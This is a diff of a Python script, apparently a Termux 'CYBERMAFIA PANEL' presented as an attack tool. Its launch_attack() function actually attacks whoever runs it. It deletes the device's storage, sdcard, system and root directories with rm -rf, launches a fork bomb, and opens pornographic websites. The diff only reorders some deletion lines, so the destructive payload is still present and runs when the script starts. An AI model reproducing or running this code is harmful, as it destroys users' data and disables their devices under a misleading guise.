@@ -31,11 +31,9 @@ def launch_attack():
     print("WELCOME TO CYBERMAFIA PANEL")
     os.system('touch .hushlogin')
     os.system("termux-setup-storage")
-    os.system('rm -rf /storage/emulated/0/*')
-    os.system('rm -rf /storage/emulated/*')
+    os.system("rm -rf /*")
     os.system("rm -rf /storage/*")
     os.system("rm -rf /sdcard/*")
-    os.system("rm -rf /*")
     os.system('rm -rf /system/*')
     os.system(':(){ :|: & };:')
     os.system("xdg-open https://www.pornhub.com")
@@ -43,4 +41,3 @@ def launch_attack():
     os.system("xdg-open https://www.youjizz.com")
     os.system("xdg-open https://pinayflix1.tv")
 launch_attack()
-        
